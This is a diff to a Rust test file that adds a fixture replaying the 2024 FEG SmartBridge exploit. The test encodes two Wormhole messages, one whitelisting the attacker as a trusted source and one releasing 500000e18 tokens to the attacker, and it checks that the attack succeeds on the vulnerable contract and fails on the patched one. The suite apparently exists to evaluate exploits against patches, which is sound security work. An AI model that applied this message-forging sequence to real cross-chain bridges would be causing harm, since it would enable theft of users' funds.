@@ -1448,6 +1448,34 @@ mod fixture_tests {
         assert_exploit("qubit", &vuln, &patched);
     }
 
+    // ---- new Group-A fixtures ---------------------------------------------
+    #[test]
+    fn feg_bridge_2024_official_exploit_and_patch() {
+        // Faithful two-step FEG SmartBridge drain: the attacker publishes a
+        // Wormhole message from their own address (sourceAddress = attacker)
+        // whitelisting themselves, then publishes a RELEASE message draining
+        // the reserve. The relayer delivers both faithfully.
+        let Some((vuln, patched)) = eval("feg_bridge_2024", |w| {
+            let set_trusted = Token::Bytes(ethers_core::abi::encode(&[
+                Token::Uint(EU256::from(1u8)), // OP_SET_TRUSTED
+                addr_tok(attacker()),          // whitelist the attacker as a trusted source
+                Token::Uint(EU256::zero()),
+            ]));
+            let release = Token::Bytes(ethers_core::abi::encode(&[
+                Token::Uint(EU256::from(2u8)), // OP_RELEASE
+                addr_tok(attacker()),          // pay the attacker
+                Token::Uint(parse_uint("500000e18").unwrap()),
+            ]));
+            vec![
+                ucall(w, "WormholeCore", "publishMessage", vec![set_trusted]),
+                ucall(w, "WormholeCore", "publishMessage", vec![release]),
+            ]
+        }) else {
+            return;
+        };
+        assert_exploit("feg_bridge_2024", &vuln, &patched);
+    }
+
     #[test]
     fn nomad_official_exploit_and_patch() {
         let Some((vuln, patched)) = eval("nomad", |w| {
